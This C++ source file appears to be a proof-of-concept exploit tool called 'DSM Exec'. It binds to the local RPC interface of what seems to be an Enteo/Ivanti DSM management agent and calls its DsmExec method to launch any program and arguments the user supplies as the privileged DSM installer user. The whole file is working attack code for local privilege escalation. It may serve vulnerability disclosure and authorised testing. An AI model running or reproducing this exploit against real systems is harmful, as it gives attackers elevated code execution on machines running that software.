#include <windows.h>
#include <stdio.h>
#include <cstdlib>

#include "EnteoTaskExecution.h"

#pragma comment(lib, "RpcRT4.lib")
#pragma warning( disable: 4996 )


extern "C" void print_banner(const char* tool_name);


int main(int argc, char* argv[])
{
    print_banner("DSM Exec");

    if (argc != 3)
    {
        printf("%s <executable> <args>", argv[0]);
        return 1;
    }

    RPC_STATUS status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE Binding;

    status = RpcStringBindingCompose(
        NULL,
        (RPC_WSTR)L"ncalrpc",
        (RPC_WSTR)NULL,
        (RPC_WSTR)L"3B1DF259-F328-42d6-A9CD-C01DD2EF31D0",
        NULL,
        &StringBinding
    );

    printf("[*] RpcStringBindingCompose status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    printf("[*] String binding: %ws\n", (wchar_t*)StringBinding);

    status = RpcBindingFromStringBinding(StringBinding, &Binding);
    printf("[*] RpcBindingFromStringBinding status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    status = RpcStringFree(&StringBinding);
    printf("[*] RpcStringFree status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    char* args = NULL;
    wchar_t* args_w = NULL;
    wchar_t* executable_w = NULL;

    RpcTryExcept
    {
        void* ptr;
        long value;

        char* executable = argv[1];
        char* filename = strrchr(argv[1], '\\');

        if (filename == NULL)
        {
            filename = argv[1];
        }

        else
        {
            filename++;
        }

        args = (char*)malloc((strlen(filename) + strlen(argv[2]) + 2) * sizeof(char));
        sprintf(args, "%s %s", filename, argv[2]);

        executable_w = (wchar_t*)calloc(strlen(executable) + 1, sizeof(wchar_t));
        args_w = (wchar_t*)calloc(strlen(args) + 1, sizeof(wchar_t));

        mbstowcs(executable_w, executable, strlen(executable));
        mbstowcs(args_w, args, strlen(args));

        wprintf(L"[*] Executing via DSM installer user: %ws %ws\n", executable_w, args_w);

        DsmExec(Binding, &ptr, 0, executable_w, args_w, (wchar_t*)L"C:\\Windows\\System32\\", 0, 0, &value);
        printf("[*] Execution finished without an exception.");
    }

    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        printf("[*] RPCError: %d - 0x%08x\n", RpcExceptionCode(), RpcExceptionCode());
    }

    RpcEndExcept
    {
        if (args != NULL)
        {
            free(args);
        }

        if (args_w != NULL)
        {
            free(args_w);
        }

        if (executable_w != NULL)
        {
            free(executable_w);
        }

        RpcBindingFree(&Binding);
    }
}
